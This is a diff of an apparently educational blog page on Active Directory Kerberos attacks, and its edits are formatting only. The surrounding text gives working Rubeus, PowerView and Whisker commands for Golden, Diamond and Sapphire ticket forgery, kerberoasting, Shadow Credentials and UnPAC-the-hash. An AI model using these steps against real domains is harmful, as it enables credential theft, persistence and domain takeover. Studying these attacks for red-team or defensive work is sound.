@@ -637,6 +637,7 @@ Ticket combinations from Zero-Point Security</p>
 3. # Take the base64 Service Ticket from step 2 and pass it into createnetonly
    Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /domain:TESTLAB /username:Administrator /password:FakePass /ticket:&lt;Service Ticket&gt; /show
 </code></pre>
+<br>
 <h3 id="golden-ticket">Golden Ticket</h3>
 <p>While Silver Tickets are basically forged Service Tickets, the rest of the tickets shown are forged TGTs. Normal TGTs are signed with the KDC’s security principal’s hash — the krbtgt account’s password hash. A golden ticket is a way to maintain persistence on a domain after compromising it, since it requires the krbtgt account’s password hash. A golden ticket is just forging a TGT, entering a user as Domain Administrator group and using the krbtgt account’s password hash to encrypt it. After creating this Golden Ticket, we can perform Pass The Ticket using it to access any device in the entire domain.</p>
 <p>To forge a Golden Ticket we need these 4 things:</p>
@@ -677,6 +678,7 @@ Ticket combinations from Zero-Point Security</p>
    Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /username:Administrator /password:&lt;random pass&gt; /domain:&lt;DOMAIN&gt; /ticket:&lt;base64 golden ticket&gt; /show
    # Note: You can also run Rubeus' golden command on your Windows attack box, and then copy the base64 ticket to use it later
 </code></pre>
+<br>
 <h3 id="diamond-ticket">Diamond Ticket</h3>
 <p>Diamond tickets are an “upgrade” from the golden tickets because it is more opsec friendly. A diamond ticket is made by requesting a legitimate TGT that was issued by a DC, decrypting it, modifying the desired fields of the ticket, then re-encrypting it. This overcomes the shortcoming of a golden ticket beecause any TGS-REQs will have a preceding AS-REQ.</p>
 <p><strong>Abuse in Windows</strong></p>
@@ -705,6 +707,7 @@ Ticket combinations from Zero-Point Security</p>
 </ol>
 <p>The advantage of U2U is that the server-user does not need to store a long-term key on their desktop, reducing the risk of key theft.</p>
 <p>The disadvantage of U2U is that the server-user must regularly renew their TGT, meaning the server cannot operate autonomously without periodic user intervention.</p>
+<br>
 <h3 id="sapphire-ticket">Sapphire Ticket</h3>
 <p>Sapphire tickets are similar to Diamond tickets because the tickets are not completely forged, they are obtained after a request.</p>
 <p>Diamond tickets modify PACs on-the-fly to include arbitrary group IDs, chances are some detection software can detect discrepancies between a PAC’s values and actual AD relationships (e.g. a PAC indicates a user belongs to some groups when in fact it doesn’t).</p>
@@ -761,13 +764,14 @@ Ticket combinations from Zero-Point Security</p>
 <pre class=" language-bash"><code class="prism  language-bash">1. <span class="token comment"># Use the samaccountname of the as-rep roastable user 'alice' for this next command. Supply the username wordlist.</span>
    Rubeus.exe kerberoast /nopreauth:alice /spns:users.txt /nowrap
 </code></pre>
+<br>
 <h3 id="spn-jacking">SPN-Jacking</h3>
+<br>
 <h3 id="shadow-credentials">Shadow Credentials</h3>
 <p>Shadow Credentials is an attack that abuses DACL permissions to add “Key Credentials” to the target object to then perform Kerberos authentication using PKINIT and gain access as that user.</p>
 <p>For this attack to work, the domain must have ADCS installed and a CA configured, and we must have control of an account with write permissions over the object in order to add the keys.</p>
 <p>A lot of the information I will be covering here is from <a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab">this</a> SpecterOps post. It is a really great read, but I’ll explain it here in a more summarized manner.</p>
-<p><strong>Let’s learn about Shadow Credentials</strong></p>
-<p><strong>What is PKINIT</strong></p>
+<p><strong>What is PKINIT?</strong></p>
 <p>As we covered in Pass the Certificate, PKINIT is a way to perform pre-authentication using asymmetrics keys. When a user enrolls into Windows Hello for Business (WHfB), the computer’s TPM (Trusted Platform Module) generates a a public-private key pair for the user’s account. The private key is stored in, and never leaves, the TPM. It is protected by a PIN code which can optionally be replaced with biometrics.</p>
 <p>If using the Key Trust model in PKI, the client’s public key is stored in an attribute called <code>msDS-KeyCredentialLink</code>. The values of this attribute are called Key Credentials. Each Key Credential contains information such as the creation date, the distinguished name of the owner, a GUID that represents a Device ID, and the public key itself.</p>
 <p>In normal Kerberos authentication, a client will encrypt their pre-auth data with their secret key, which is just their password hash, and send it to the KDC which decrypts it using the same key. This is symmetric encryption. However with PKINIT, the client will encrypt the pre-auth data with their private key, and the KDC will decrypt it with the client’s public key stored in the <code>msDS-KeyCredentialLink</code> attribute. This is asymmetric encryption.</p>
@@ -796,16 +800,16 @@ Ticket combinations from Zero-Point Security</p>
 </code></pre>
 <p><strong>Abuse in Windows:</strong></p>
 <pre class=" language-bash"><code class="prism  language-bash">1. <span class="token comment"># Let's import PowerView and enumerate principals with write access over the msDS-KeyCredentialLink attribute on other principals.</span>
-	 a. <span class="token comment"># Import PowerView</span>
-		  Import-Module PowerView.ps1
+   a. <span class="token comment"># Import PowerView</span>
+	  Import-Module PowerView.ps1
 		  
-	 b. <span class="token comment"># Identify users/groups/machines with write access over the msds-key-credential-link attribute on a computer.</span>
-		  <span class="token comment"># Make sure to put in your domain and domain SID!</span>
-		  Get-DomainComputer -Domain <span class="token operator">&lt;</span>domain<span class="token operator">&gt;</span> <span class="token operator">|</span> Get-DomainObjectAcl -ResolveGUIDs <span class="token operator">|</span> ? <span class="token punctuation">{</span> <span class="token variable">$_</span>.ObjectAceType -match <span class="token string">"ms-DS-Key-Credential-Link"</span> -and <span class="token variable">$_</span>.SecurityIdentifier -match <span class="token string">"&lt;domain SID&gt;-[\\d]{4,10}"</span> <span class="token punctuation">}</span> <span class="token operator">|</span> <span class="token keyword">select</span> @<span class="token punctuation">{</span>Name<span class="token operator">=</span><span class="token string">"Computer"</span><span class="token punctuation">;</span>Expression<span class="token operator">=</span><span class="token punctuation">{</span>ConvertFrom-SID <span class="token variable">$_</span>.ObjectSID<span class="token punctuation">}</span><span class="token punctuation">}</span>,objectdn,activedirectoryrights,objectacetype,@<span class="token punctuation">{</span>Name<span class="token operator">=</span><span class="token string">"User/Group"</span><span class="token punctuation">;</span>Expression<span class="token operator">=</span><span class="token punctuation">{</span>ConvertFrom-SID <span class="token variable">$_</span>.SecurityIdentifier<span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token operator">|</span> fl
+   b. <span class="token comment"># Identify users/groups/machines with write access over the msds-key-credential-link attribute on a computer.</span>
+	  <span class="token comment"># Make sure to put in your domain and domain SID!</span>
+	  Get-DomainComputer -Domain <span class="token operator">&lt;</span>domain<span class="token operator">&gt;</span> <span class="token operator">|</span> Get-DomainObjectAcl -ResolveGUIDs <span class="token operator">|</span> ? <span class="token punctuation">{</span> <span class="token variable">$_</span>.ObjectAceType -match <span class="token string">"ms-DS-Key-Credential-Link"</span> -and <span class="token variable">$_</span>.SecurityIdentifier -match <span class="token string">"&lt;domain SID&gt;-[\\d]{4,10}"</span> <span class="token punctuation">}</span> <span class="token operator">|</span> <span class="token keyword">select</span> @<span class="token punctuation">{</span>Name<span class="token operator">=</span><span class="token string">"Computer"</span><span class="token punctuation">;</span>Expression<span class="token operator">=</span><span class="token punctuation">{</span>ConvertFrom-SID <span class="token variable">$_</span>.ObjectSID<span class="token punctuation">}</span><span class="token punctuation">}</span>,objectdn,activedirectoryrights,objectacetype,@<span class="token punctuation">{</span>Name<span class="token operator">=</span><span class="token string">"User/Group"</span><span class="token punctuation">;</span>Expression<span class="token operator">=</span><span class="token punctuation">{</span>ConvertFrom-SID <span class="token variable">$_</span>.SecurityIdentifier<span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token operator">|</span> fl
 		  
-	 c. <span class="token comment"># Now identify users/groups/machines with write access over the msds-key-credential-link attribute on a user.</span>
-		  <span class="token comment"># Again, make sure to put in your domain and domain SID!</span>
-	 	  Get-DomainUser -Domain <span class="token operator">&lt;</span>domain<span class="token operator">&gt;</span> <span class="token operator">|</span> Get-DomainObjectAcl -ResolveGUIDs <span class="token operator">|</span> ? <span class="token punctuation">{</span> <span class="token variable">$_</span>.ObjectAceType -match <span class="token string">"ms-DS-Key-Credential-Link"</span> -and <span class="token variable">$_</span>.SecurityIdentifier -match <span class="token string">"&lt;domain SID&gt;-[\\d]{4,10}"</span> <span class="token punctuation">}</span> <span class="token operator">|</span> <span class="token keyword">select</span> @<span class="token punctuation">{</span>Name<span class="token operator">=</span><span class="token string">"Computer"</span><span class="token punctuation">;</span>Expression<span class="token operator">=</span><span class="token punctuation">{</span>ConvertFrom-SID <span class="token variable">$_</span>.ObjectSID<span class="token punctuation">}</span><span class="token punctuation">}</span>,objectdn,activedirectoryrights,objectacetype,@<span class="token punctuation">{</span>Name<span class="token operator">=</span><span class="token string">"User/Group"</span><span class="token punctuation">;</span>Expression<span class="token operator">=</span><span class="token punctuation">{</span>ConvertFrom-SID <span class="token variable">$_</span>.SecurityIdentifier<span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token operator">|</span> fl
+   c. <span class="token comment"># Now identify users/groups/machines with write access over the msds-key-credential-link attribute on a user.</span>
+      <span class="token comment"># Again, make sure to put in your domain and domain SID!</span>
+	  Get-DomainUser -Domain <span class="token operator">&lt;</span>domain<span class="token operator">&gt;</span> <span class="token operator">|</span> Get-DomainObjectAcl -ResolveGUIDs <span class="token operator">|</span> ? <span class="token punctuation">{</span> <span class="token variable">$_</span>.ObjectAceType -match <span class="token string">"ms-DS-Key-Credential-Link"</span> -and <span class="token variable">$_</span>.SecurityIdentifier -match <span class="token string">"&lt;domain SID&gt;-[\\d]{4,10}"</span> <span class="token punctuation">}</span> <span class="token operator">|</span> <span class="token keyword">select</span> @<span class="token punctuation">{</span>Name<span class="token operator">=</span><span class="token string">"Computer"</span><span class="token punctuation">;</span>Expression<span class="token operator">=</span><span class="token punctuation">{</span>ConvertFrom-SID <span class="token variable">$_</span>.ObjectSID<span class="token punctuation">}</span><span class="token punctuation">}</span>,objectdn,activedirectoryrights,objectacetype,@<span class="token punctuation">{</span>Name<span class="token operator">=</span><span class="token string">"User/Group"</span><span class="token punctuation">;</span>Expression<span class="token operator">=</span><span class="token punctuation">{</span>ConvertFrom-SID <span class="token variable">$_</span>.SecurityIdentifier<span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token operator">|</span> fl
 
 2. <span class="token comment"># Compromise the privileged account from step 1. After that, list keys that may be present on the target to keep track of this for later when clearing.</span>
    Whisker.exe list /target:dc$
@@ -822,6 +826,7 @@ Ticket combinations from Zero-Point Security</p>
 6. <span class="token comment"># Now pass into createnetonly</span>
    Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe /domain:TESTLAB /username:Administrator /password:randompass /ticket:<span class="token operator">&lt;</span>base64 <span class="token function">service</span> ticket<span class="token operator">&gt;</span> /show
 </code></pre>
+<br>
 <h3 id="unpac-the-hash">UnPAC the Hash</h3>
 <p>Let’s add on to what we learned from the Shadow Credentials attack, if a TGT was obtained with PKINIT, and you use it to request a service ticket, the service ticket will contain the NTLM hash of the user/computer that the TGT belongs to, inside the PAC in the PAC_CREDENTIAL_INFO field. And just like normal, the ticket is encrypted using the key of the service it is issued for. This was implemented for compatibility in the event the user/computer needs to access resources that require NTLM authentication.</p>
 <p>Typically we shouldn’t be able to decrypt a service ticket because it will be encrypted with the service’s password hash. Except if we perform U2U + S4U2Self, we will be able to decrypt the service ticket because it is for ourself (remember a U2U service ticket is encrypted with the session key associated with the TGT which we got from the AS-REP), and then we can decrypt the service ticket using the obtained session key to read the PAC and obtain the user/computer’s NTLM hash.</p>
